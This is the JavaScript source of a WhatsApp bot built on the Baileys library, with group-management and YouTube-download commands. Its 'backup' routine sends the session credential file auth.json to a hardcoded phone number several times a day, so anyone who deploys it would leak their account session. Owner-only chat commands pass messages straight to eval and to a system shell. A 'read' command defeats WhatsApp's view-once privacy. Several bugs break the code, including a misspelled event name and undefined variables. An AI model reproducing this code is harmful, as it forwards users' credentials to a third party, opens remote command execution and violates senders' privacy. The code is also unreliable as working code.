import baileys from "@adiwajshing/baileys"
import axios from "axios"
import fetch from "node-fetch"
import fs from "fs"
import util from "util"
import cp from "child_process"
import module from "module"
import os from "os"
import hr from "human-readable"
import got from "got"
import chalk from "chalk"
import moment from "moment-timezone"
import EventEmitter from "events"

//create require module
let require = module.createRequire(import.meta.url)
let loggedOut = 401
var ytRegex = /(?:http(?:s|):\/\/|)(?:(?:www\.|)?youtube(?:\-nocookie|)\.com\/(?:shorts\/)?(?:watch\?.*(?:|\&)v=|embed\/|v\/)?|youtu\.be\/)([-_0-9A-Za-z]{11})/

let setting = {
    owner: ["6282135250846@s.whatsapp.net",
        "6285640020165@s.whatsapp.net"],
    prefix: "/",
    backup: true,
    version: [2,
        2204,
        13]
}

function main() {
        let {
            state,
            saveState
        } = baileys.useSingleFileAuthState("auth.json")
        let sock = global.sock = baileys.default({
            auth: state,
            printQRInTerminal: true,
            version: setting.version
        })
        sock.ev.on("credts.update", saveState)
        sock.ev.on("connection.update", update => {
            if (update.connection == "close") {
                console.log(update.lastDisconnect?.error)
                if (update.lastDisconnect?.error?.output?.statusCode !== loggedOut) {
                    delete global.sock
                    main()
                } 
                if (update.connection == "open") {
                    console.log("Connect to WA Web")
                }
            }
        })
        sock.ev.on("messages.upsert",
            async(message) => {
              try {
                if (!message.messages[0]) return;
                let timestamp = new Date()
                let msg = message.messages[0]
                if (!msg.message) return;
                let type = Object.keys(msg.message)[0]
                let from = msg.key.remoteJid;
                let isGroup = from.endsWith("@g.us")
                let sender = isGroup ? msg.key.participant: from;
                let metadata = isGroup ? await sock.groupMetadata(from): ""
                let isMeAdmin = isGroup ? metadata.participants.find(v => v.id == sock.user.id.split(":")[0] + "@s.whatsapp.net").admin: ""
                let isAdmin = isGroup ? metadata.participants.find(u => u.id == sender)?.admin: ""
                isMeAdmin = isMeAdmin == "admin" || isMeAdmin == "superadmin"
                isAdmin = isAdmin == "admin" || isAdmin == "superadmin"
                let pushname = msg.pushName
                let body = msg.message?.conversation || msg.message?.imageMessage?.caption || msg.message?.videoMessage?.caption || msg.message?.extendedTextMessage?.text || msg.message?.listResponseMessage?.singleSelectReply?.selectedRowId || msg.message?.buttonsResponseMessage?.selectedButtonId || "";
                let args = body.trim().split(/ +/).slice(1)
                let q = args.join(" ")
                let command = body.slice(0).trim().split(/ +/).shift().toLowerCase()
                let isOwner = !!setting.owner.find(o => o == sender)
                let time = moment.tz("Asia/Jakarta").format("HH:mm:ss")
                let prefix = setting.prefix
                if (command.startsWith(setting.prefix)) console.log("["+"\n"+color("yellow", "Time: ")+color("magenta", time)+"\n"+color("yellow", "From: ")+pushname+"\n"+color("yellow", "Command: ")+command.replace(setting.prefix, "")+"\n"+color("yellow", "MessageType: ")+type+"\n]")

                function reply(text) {
                    sock.sendMessage(from, {
                        text
                    }, {
                        quoted: msg
                    })
                }
                function sendListMessage(jid, title, text, footer, buttonText, sections) {
                    return sock.sendMessage(from, {
                        text,
                        footer,
                        buttonText,
                        title,
                        sections
                    })
                }
                async function sendButtonImg(jid, url, caption, buttons, headerType = 4) {
                    var image;
                    if (url.startsWith("http://") || url.startsWith("https://")) {
                        var buff = await (await fetch(url)).buffer()
                        image = buff
                    } else if (Buffer.isBuffer(url)) {
                        image = url
                    } else if (fs.existsSync(url) && url.endsWith(".png") || url.endsWith(".jpg") || url.endsWith("jpeg")) {
                        image = await fs.readFileSync(url)
                    } else if (/^data:.*?\/.*?;base64,/i.test(url)) {
                        image = Buffer.from(url.split(",")[1], "base64")
                    } else {
                        var buff = await (await fetch("https://github.com/SanzGantengz")).buffer()
                        image = buff
                    }
                    if (image) {
                        return sock.sendMessage(jid, {
                            image,
                            caption,
                            buttons,
                            footerText: "©SanZ",
                            headerType
                        })
                    }
                }

                if (setting.backup) {
                    if (time == "12:00:00") {
                        sock.sendMessage("6282135250846@s.whatsapp.net", {
                            document: fs.readFileSync("auth.json"), fileName: "auth.json", mimetype: "application/json"
                        })
                    }
                    if (time == "18:00:00") {
                        sock.sendMessage("6282135250846@s.whatsapp.net", {
                            document: fs.readFileSync("auth.json"), fileName: "auth.json", mimetype: "application/json"
                        })
                    }
                    if (time == "00:00:00") {
                        sock.sendMessage("6282135250846@s.whatsapp.net", {
                            document: fs.readFileSync("auth.json"), fileName: "auth.json", mimetype: "application/json"
                        })
                    }
                    if (time == "06:00:00") {
                        sock.sendMessage("6282135250846@s.whatsapp.net", {
                            document: fs.readFileSync("auth.json"), fileName: "auth.json", mimetype: "application/json"
                        })
                    }
                }

                switch (command) {
                    case prefix + "menu":
                        let groups = Object.keys(await sock.groupFetchAllParticipating());
                        let formatMem = hr.sizeFormatter({
                            std: 'JEDEC',
                            decimalPlaces: 2,
                            keepTrailingZeroes: false,
                            render: (literal,
                                symbol) => `${literal} ${symbol}B`
                        })
                        let teks = `list groups: ${groups.length}
All cpu: ${os.cpus().length}
Type cpu: ${os.cpus()[0]?.model ?? "Not Detected"}
Speed cpu: ${os.cpus()[0]?.speed ?? "Not Detected"}
platform: ${os.platform()} ${os.arch()}
Memory: ${formatMem(os.totalmem() - os.freemem())} / ${formatMem(os.totalmem())}
Hostname: ${os.hostname()}

*NOTE*
Bot ini sedang dalam proses pengembangan
anda dapat mengundangnya secara gratis
dengan cara ketik .join <link group>
`
                        reply(teks.trim())
                        break;
                    case prefix + "resetlink":
                        case prefix + "restlink":
                            if (!isGroup) return reply("Only group")
                            if (!isMeAdmin) return reply("Bot bukan admin")
                            if (!isAdmin) reply("Only admin")
                            try {
                                var code = await sock.groupRevokeInvite(from)
                                reply("Suscess reset link\nnew link: https://chat.whatsapp.com/" + code)
                            } catch(e) {
                                console.error(e)
                            }
                            break;
                        case prefix + "getpp":
                            if (isGroup && !q) return reply("Masukan nomor atau tag member!")
                            if (!q) return reply("Masukan nomor!")
                            let no;
                            let image;
                            if (q.includes("@s.whatsapp.net")) no = q.replace("@s.whatsapp.net", "")
                            else if (q.startsWith("@")) no = q.replace("@", "")
                            else no = q;
                            var data = await sock.onWhatsApp(no + "@s.whatsapp.net")
                            if (data.length > 0) {
                                sock.profilePictureUrl(data.jid).then(async(pp) => {
                                    sock.sendMessage(from, {
                                        image: await (await fetch(pp)).buffer()
                                    }, {
                                        quoted: msg
                                    })
                                }).catch(_ => {
                                    reply("No Profile")
                                })
                            }
                            break;
                        case prefix + "link":
                            if (!isGroup) return reply("Only group")
                            if (!isMeAdmin) return reply("Bot bukan admin")
                            var code = await sock.groupInviteCode(from)
                            reply("https://chat.whatsapp.com/" + code)
                            break;
                        case prefix + "leave":
                            if (!isGroup) return reply("Only group")
                            if (!isOwner) return reply("Only owner")
                            sock.groupLeave(from)
                            break;
                        case prefix + "join":
                            //if (!isOwner) return reply("Only owner")
                            if (!q) return reply("Link?")
                            if (!/https?:\/\/(chat\.whatsapp\.com)\/[A-Za-z]/.test(q)) return reply("Link tidak valid")
                            try {
                                var code = q.split("/")[3]
                                await sock.groupAcceptInvite(code)
                                reply("Suscess join")
                            } catch(e) {
                                reply(String(e))
                            }
                            break;
                        case prefix + "yts":
                            case prefix + "ytsearch":
                                if (!q) return reply("Masukan parameter query")
                                var data = await Youtube()
                                reply("Wait...")
                                try {
                                    var res = await data.search(q)
                                    var row = []
                                    for (var i = 0; i < res.length; i++) {
                                        row.push({
                                            title: "URUTAN KE-" + i-1,
                                            rows: [{
                                                title: res[i].title,
                                                rowId: prefix + "yt " + res[i].id,
                                                description: "https://youtu.be/" + res[i].id
                                            }]
                                        })
                                    }
                                    await sendListMessage(from, "\t\tYOUTUBE SEARCH", `get ${res.length} results`, "©SanZ", "CLICK DISINI", row)
                                } catch(e) {
                                    console.error(e)
                                    return reply("Terjadi kesalahan")
                                }
                                break;
                            case prefix + "yt":
                                if (!q) return;
                                var yt = await Youtube()
                                var info = await yt.getDetails(q)
                                var capt = `JUDUL: ${info.title}\nPENONTON: ${info.metadata.view_count}\nSUKA; ${info.metadata.likes}\nKATEGORI: ${info.metadata.category}\nAUTHOR: ${info.metadata.author}\nKUALITAS: ${info.metadata.available_qualities.join(", ")}\nLINK: https://youtu.be/${q}`
                                sendButtonImg(from, info.thumbnail.url, capt, [{
                                    buttonId: prefix + "yt3 " + q,
                                    buttonText: {
                                        displayText: "AUDIO"
                                    }
                                },
                                    {
                                        buttonId: prefix + "yt4 " + q,
                                        buttonText: {
                                            displayText: "VIDEO"
                                        }
                                    }])
                                break;
                            case prefix + "yt3":
                                case prefix + "ytmp3":
                                if (!q) return reply("Id atau url kosong")
                                if (ytRegex.test(q)) q = ytRegex.exec(q)[1]
                                var yt = await Youtube()
                                var filename = getRandom("mp3")
                                var out = getRandom("mp3")
                                var stream = await yt.download(q, "mp3", "144p", filename)
                                stream.on("end", async() => {
                                  var outname = await ffmpegDefault(filename, out)
                                    await sock.sendMessage(from, {
                                        audio: fs.readFileSync(outname), mimetype: "audio/mpeg", fileName: new Date() + "sanz_bot.mp3"
                                    }, {
                                        quoted: msg
                                    })
                                })
                                setTimeout(() => {
                                    deletePath(filename)
                                    deletePath(ooutname)
                                }, 50000)
                                break;
                            case prefix + "yt4":
                                case prefix + "ytmp4":
                                if (!q) return reply("Id kosong")
                                if (ytRegex.test(q)) q = ytRegex.exec(q)[1]
                                var yt = await Youtube()
                                var details = await yt.getDetails(q)
                                var filename = getRandom("mp4")
                                var quality = details.metadata.available_qualities
                                var stream = await yt.download(q, "mp4", quality[quality.length-1], filename)
                                stream.on("end", () => {
                                    sock.sendMessage(from, {
                                        document: fs.readFileSync(filename), mimetype: "video/mp4", fileName: details.title
                                    }, {
                                        quoted: msg
                                    })
                                })
                                break;
                                case prefix + "play":
                                    if (!q) return reply("Masukan parameter query")
                                    var yt = Youtube()
                                    if (ytRegex.test(q)) q = ytRegex.exec(q)[1]
                                    var info = await yt.getDetails(q)
                                    var caption = `JUDUL: ${info.title}\nPENONTON: ${info.metadata.view_count}\nSUKA; ${info.metadata.likes}\nKATEGORI: ${info.metadata.category}\nAUTHOR: ${info.metadata.author}\nKUALITAS: ${info.metadata.available_qualities.join(", ")}\nLINK: https://youtu.be/${q}`
                                    sock.sendMessage(from, { image: {
                                      url 
                                    },
                                      caption
                                    }, {
                                      quoted: msg 
                                    })
                                    var filename = getRandom(".mp3")
                                    var out = getRandom(".mp3")
                                    var stream = await yt.download(q, "mp3", "144p", filename)
                                stream.on("end", async() => {
                                  var outname = await ffmpegDefault(filename, out)
                                  sock.sendMessage(from, { document: fs.readFileSync(outname), mimetype: "audio/mpeg"
                                  }, {
                                    quoted: msg
                                  })
                                })
                                setTimeout(() => {
                                  deletePath(filename)
                                  deletePath(outname)
                                }, 10000)
                                break;
                                case "read":
                                  if (!msg.message[type]?.contextInfo?.quotedMessage) return;
                                  if (Object.keys(msg.message.extendedTextMessage.contextInfo.quotedMessage)[0] != "viewOnceMessage") return;
                                    var anu = msg.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessage.message
                                    var tipe = Object.keys(anu)[0]
                                    anu[tipe].viewOnce = false
                                    var ah = {}
                                    if (anu[tipe].caption) ah.caption = anu[tipe].caption
                                    if (anu[tipe]?.contextInfo?.mentionedJid) {
                                        ah.contextInfo = {}
                                        ah.contextInfo.mentionedJid = anu[tipe]?.contextInfo?.mentionedJid ?? []
                                    }
                                    var dta = await baileys.downloadContentFromMessage(anu[tipe], tipe.split("M")[0])
                                    sock.sendMessage(from, { 
                                        [tipe.split("M")[0]]: await streamToBuff(dta),
                                        ...ah 
                                      }, {
                                        quoted: msg
                                      })
                                break;
                                case ">":
                                    if (!isOwner) return;
                                    try {
                                        var text = util.format(await eval(`(async()=>{\ntry{\n${args.join(" ")} }catch(e){\nreply(util.format(e))\n}\n})()`))
                                        sock.sendMessage(from, {
                                            text
                                        }, {
                                            quoted: msg
                                        })
                                    } catch(e) {
                                        sock.sendMessage(from, {
                                            text: util.format(e)}, {
                                            quoted: msg
                                        })
                                    }
                                break;
                                case "=>":
                                    if (!isOwner) return;
                                    try {
                                        var text = util.format(await eval(`(async() => { return ${args.join(" ")} })()`))
                                        sock.sendMessage(from, {
                                            text
                                        }, {
                                            quoted: msg
                                        })
                                    } catch(e) {
                                        sock.sendMessage(from, {
                                            text: util.format(e)}, {
                                            quoted: msg
                                        })
                                    }
                                break;
                                case "$":
                                      if (!isOwner) return;
                                      try {
                                        cp.exec(args.join(" "), function(er, st) {
                                            if (er) sock.sendMessage(from, {
                                                text: util.format(er.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))
                                            }, {
                                                quoted: msg
                                            })
                                            if (st) sock.sendMessage(from, {
                                                text: util.format(st.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))}, {
                                                quoted: msg
                                            })
                                        })
                                    } catch(e) {
                                        console.warn(e)
                                    }
                                break;
                                case false:
                                    console.log("\n")
                                break;
                        }
              } catch(e) {
                return sock.sendMessage("6282135250846@s.whatsapp.net", { text: (String(e)) })
              }
            })
}

    main()


    function checkVersion() {
        axios.get("https://web.whatsapp.com/check-update?version=1&platform=web").then(res => {
            let version = res.data.currentVersion
            setting.version = version.split(".")
            return setting
        })
    }

    async function Youtube(cookie) {
      let Innertube = (await import("youtubei.js")).default
        let youtube = await new Innertube(cookie)
        let ev = await new EventEmitter()
        let result = []
        return {
            ...ev,
            youtube,
            search: async(query, type) => {
                let res = await youtube.search(query)
                for (let i = 0; i < res.videos.length; i++) {
                    result.push({
                        title: res.videos[i].title,
                        id: res.videos[i].id,
                        url: res.videos[i].url,
                        duration: res.videos[i].metadata.duration.simple_text,
                        publish: res.videos[i].metadata.published,
                        thumbnail: res.videos[i].metadata.thumbnails[0].url,
                        views: res.videos[i].metadata.view_count,
                        author: {
                            name: res.videos[i].author,
                            url: res.videos[i].channel_url
                    },
                        description: res.videos[i].description
                })
        }
        return result
    },
    download: async(id, format, quality = "720p", filename) => {
        if (!format) throw new Error("format is null")
        if (format == "mp3") quality = "144p"
        let stream = await youtube.download(id, {
            format: format,
            quality: quality,
            type: "videoandaudio"
        })
        stream.pipe(fs.createWriteStream(filename))
        stream.on("error", err => {
            throw err
        })
        stream.on("progress", info => {
            console.log(`[ DOWNLOADER ] Downloaded: ${info.percentage}% (${info.downloaded_size}MB) of ${info.size}MB`)
        })
        return stream
    },
    getDetails: async(id) => {
        if (!id) return new Error("video id null")
        var data = await youtube.getDetails(id)
        return await data
    },
    login: async(path = "youtube_creds.json") => {
        let creds = fs.existsSync(path) && JSON.parse(fs.readFileSync(path).toString()) || {}
        youtube.ev.on("auth", data => {
            console.log(data)
            if (data.status === "AUTHORIZATION_PENDING") {
                ev.emit("verification", {
                    url: data.verification_url, code: data.code
                })
            } else if (data.status == "SUCCESS") {
                fs.writeFileSync(path, JSON.stringify(data.credentials))
                ev.emit("login:suscess")
            }
        })
        youtube.ev.on("update-credentials",
            data => {
                fs.writeFileSync(path, JSON.stringify(data.credentials))
                ev.emit("credentials.update", data)
            })
        await youtube.signIn(creds)
    }
}
}

function getRandom(ext) {
ext = ext || ""
return `${Math.floor(Math.random() * 100000)}.${ext}`
}

async function downloadM(msg) {
if (!msg) throw new Error("message can not be empty")
let type = Object.keys(msg.message)[0]
msg = msg.message[type]?.contextInfo?.quotedMessage ?? msg.message
let quotedType = Object.keys(msg)[0]
let stream = await baileys.downloadContentFromMessage(msg[quotedType],
quotedType.split("M")[0])
let buff = await streamToBuff(stream)
return buff
}

async function streamToBuff(stream) {
let buff = Buffer.alloc(0)
for await (const chunk of stream) buff = Buffer.concat([buff, chunk])
return buff
}

function ffmpegDefault(path, out) {
let ff = cp.execSync(`ffmpeg -i ${path} ${out}`)
if (ff.length == 0) return out
}

function color(c, t) {
return chalk[c](t)
}

function deletePath(path) {
  return fs.unlinkSync(path)
}

